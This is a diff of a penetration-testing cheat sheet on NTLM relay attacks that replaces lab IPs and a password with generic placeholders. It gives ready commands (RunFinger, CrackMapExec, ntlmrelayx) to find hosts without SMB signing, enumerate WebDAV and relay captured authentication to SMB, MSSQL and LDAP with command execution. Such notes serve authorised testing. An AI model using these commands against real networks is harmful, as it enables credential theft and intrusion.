@@ -1,6 +1,6 @@
 # NTLM Relay Attacks
 
-> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`
+> **Pre-req:** `source /opt/venvTools/bin/activate`
 
 ### Enumerate Relay Targets (SMB Signing Disabled) [added: 2026-04]
 - **Tags:** #SMBSigning #RelayTarget #RunFinger #CrackMapExec #NTLMRelay #T1557.001
@@ -12,10 +12,10 @@
 - **Payload/Method:**
   ```bash
   # RunFinger (Responder toolkit)
-  python3 RunFinger.py -i 172.16.117.0/24
+  python3 RunFinger.py -i <TARGET_SUBNET>/24
 
   # CrackMapExec
-  crackmapexec smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
+  crackmapexec smb <TARGET_SUBNET>/24 --gen-relay-list relayTargets.txt
   ```
 
 ### Enumerate WebDAV Servers [added: 2026-04]
@@ -25,7 +25,7 @@
 - **Yields:** List of WebDAV-enabled servers (can be coerced into HTTP NTLM auth, relayable to LDAP)
 - **Opsec:** Low
 - **Context:** WebDAV servers can be coerced into HTTP-based NTLM auth, which can be relayed to LDAP (no signing by default).
-- **Payload/Method:** `crackmapexec smb 172.16.117.0/24 -u plaintext$ -p 'PASSWORD' -M webdav`
+- **Payload/Method:** `crackmapexec smb <TARGET_SUBNET>/24 -u plaintext$ -p '<TARGET_PASSWORD>' -M webdav`
 
 ### Hash Farming via NTLM Theft Files [added: 2026-04]
 - **Tags:** #NTLMTheft #HashFarming #LNK #searchConnector #slinky #CredentialCapture #T1187
@@ -59,16 +59,16 @@
   ntlmrelayx.py -tf relayTargets.txt -smb2support
 
   # Execute command on relay
-  ntlmrelayx.py -t 172.16.117.50 -smb2support -c "whoami"
+  ntlmrelayx.py -t <TARGET_IP> -smb2support -c "whoami"
 
   # Protocol-specific targets
-  ntlmrelayx.py -t smb://172.16.117.50
-  ntlmrelayx.py -t mssql://172.16.117.50
-  ntlmrelayx.py -t ldap://172.16.117.50
-  ntlmrelayx.py -t all://172.16.117.50
+  ntlmrelayx.py -t smb://<TARGET_IP>
+  ntlmrelayx.py -t mssql://<TARGET_IP>
+  ntlmrelayx.py -t ldap://<TARGET_IP>
+  ntlmrelayx.py -t all://<TARGET_IP>
 
   # Named target (relay specific user's auth)
-  ntlmrelayx.py -t smb://DOMAIN\\USER@172.16.117.50
+  ntlmrelayx.py -t smb://DOMAIN\\USER@<TARGET_IP>
   ```
 
 ### NTLMRelayx — SOCKS Proxy for Relayed Sessions [added: 2026-04]
